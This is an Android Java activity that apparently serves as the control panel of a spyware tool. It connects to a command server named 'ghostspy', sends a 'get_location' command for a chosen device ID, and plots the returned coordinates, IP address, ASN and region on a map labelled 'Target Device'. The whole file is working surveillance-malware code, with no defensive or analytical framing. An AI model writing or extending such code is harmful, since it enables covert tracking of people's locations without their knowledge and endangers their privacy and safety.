package com.testapp;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class TrackingActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private WebView mapView;
    private TextView infoText;
    private double lat = -6.2088, lon = 106.8456; // default Jakarta
    private String ip = "192.168.1.5", asn = "AS1234 Telkom", region = "Jakarta";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);
        root.setPadding(8, 8, 8, 8);

        // Map WebView
        mapView = new WebView(this);
        mapView.getSettings().setJavaScriptEnabled(true);
        mapView.setWebViewClient(new WebViewClient());
        mapView.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams mapParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0);
        mapParams.weight = 1;
        mapView.setLayoutParams(mapParams);
        root.addView(mapView);

        // Info Panel
        infoText = new TextView(this);
        infoText.setText("IP: " + ip + "\nASN: " + asn + "\nRegion: " + region);
        infoText.setTextColor(0xFFFFFFFF);
        infoText.setBackgroundColor(0xFF151515);
        infoText.setPadding(12, 12, 12, 12);
        infoText.setTextSize(13);
        root.addView(infoText);

        setContentView(root);

        // Socket
        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("location", args -> {
            try {
                JSONObject loc = (JSONObject) args[0];
                lat = loc.optDouble("lat", lat);
                lon = loc.optDouble("lon", lon);
                ip = loc.optString("ip", ip);
                asn = loc.optString("asn", asn);
                region = loc.optString("region", region);
                runOnUiThread(() -> {
                    updateMap();
                    infoText.setText("IP: " + ip + "\nASN: " + asn + "\nRegion: " + region);
                });
            } catch (Exception e) {}
        });

        // Minta lokasi
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", "get_location");
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
            } catch (Exception e) {}
        }

        updateMap();
    }

    private void updateMap() {
        String html = "<!DOCTYPE html><html><head>"
                + "<link rel='stylesheet' href='https://unpkg.com/leaflet@1.9.4/dist/leaflet.css'/>"
                + "<script src='https://unpkg.com/leaflet@1.9.4/dist/leaflet.js'></script>"
                + "<style>body{margin:0;background:#000;} #map{width:100vw;height:100vh;}</style>"
                + "</head><body><div id='map'></div><script>"
                + "var map = L.map('map').setView([" + lat + "," + lon + "], 15);"
                + "L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {attribution:'© OpenStreetMap'}).addTo(map);"
                + "L.marker([" + lat + "," + lon + "]).addTo(map).bindPopup('Target Device').openPopup();"
                + "</script></body></html>";
        mapView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
